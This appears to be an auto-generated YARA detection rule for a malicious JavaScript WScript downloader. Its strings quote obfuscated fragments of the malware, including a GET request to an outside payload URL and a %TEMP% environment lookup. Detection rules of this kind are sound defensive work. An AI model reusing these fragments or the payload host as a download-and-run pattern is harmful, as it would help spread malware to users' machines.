rule sig_20160428_665a60153330c86ae15000c5fce38ed1 {
  meta:
    description = "datamaliciousorder - file 20160428_665a60153330c86ae15000c5fce38ed1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "982c0aaaa956e0aa2d2b5a339866d84ae8431de0491d14cf3c970b1b3f1b2fb4"

  strings:
    $s1  = "function GynRnjHoyKeeOqkOppKrf(OlyTtnYrtAhrCtxZqoFyx){HtjWdpEbwPwhMzhSxcLwr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function GynRnjHoyKeeOqkOppKrf(OlyTtnYrtAhrCtxZqoFyx){HtjWdpEbwPwhMzhSxcLwr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function ObrNhbEmkXmxGmzTddHts() {return HtjWdpEbwPwhMzhSxcLwr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return DmjDyaOsvTdoNifHgvVxd - KvyGbdZxuScxCcgBblDaw;};" fullword ascii
    $s5  = "function YhbDpyRceNbyIdlIjjYho(DmjDyaOsvTdoNifHgvVxd, KvyGbdZxuScxCcgBblDaw){DskWnuOkxNfoCioThiDlk = DskWnuOkxNfoCioThiDlk * 1; " ascii
    $s6  = "var HtjWdpEbwPwhMzhSxcLwr = function UvkLfySjaBpwSsbHsfJgy() {return VevKjfIexAqnFozXprEbp[PvpLrfDjrWneYnyGxjJwz](\"WScript\"+\"" ascii
    $s7  = "PnyIouSfwRhsVhmNahJjn[YsaAgoVvdWjjPhfTyvMbd](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s8  = "var VevKjfIexAqnFozXprEbp = this[\"WScript\"];" fullword ascii
    $s9  = "var HtjWdpEbwPwhMzhSxcLwr = function UvkLfySjaBpwSsbHsfJgy() {return VevKjfIexAqnFozXprEbp[PvpLrfDjrWneYnyGxjJwz](\"WScript\"+\"" ascii
    $s10 = "function ObrNhbEmkXmxGmzTddHts() {return HtjWdpEbwPwhMzhSxcLwr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function VjrLcoXrnOpbTkfXiuOtb(){return YylQenVvpUmrZcuDrpFyd + \"\";};" fullword ascii
    $s12 = "if (PnyIouSfwRhsVhmNahJjn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function YhbDpyRceNbyIdlIjjYho(DmjDyaOsvTdoNifHgvVxd, KvyGbdZxuScxCcgBblDaw){DskWnuOkxNfoCioThiDlk = DskWnuOkxNfoCioThiDlk * 1; " ascii
    $s14 = "function JclViaAalXllMkwTjuFyb() {return ((SkoBbyXfcEabEbiKsgEdy == true) && (SkoBbyXfcEabEbiKsgEdy == DphRhzFzrQgkZduOdbDzy)) ?" ascii
    $s15 = "function JclViaAalXllMkwTjuFyb() {return ((SkoBbyXfcEabEbiKsgEdy == true) && (SkoBbyXfcEabEbiKsgEdy == DphRhzFzrQgkZduOdbDzy)) ?" ascii
    $s16 = "var SkoBbyXfcEabEbiKsgEdy = false;" fullword ascii
    $s17 = "}while (PbgUcgSgeQswHutVbyAfe);" fullword ascii
    $s18 = "function OblUroFrtEyqOwoUbeBjb(QciQnmRecDrvUtoUlbRbn) {var NyqAfdEidPpbHnwDisCmu = (1, 2, 3, 4, 5, QciQnmRecDrvUtoUlbRbn); retur" ascii
    $s19 = "SkoBbyXfcEabEbiKsgEdy = true; " fullword ascii
    $s20 = "function SpbTafVkkArzQgqGkdXno(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}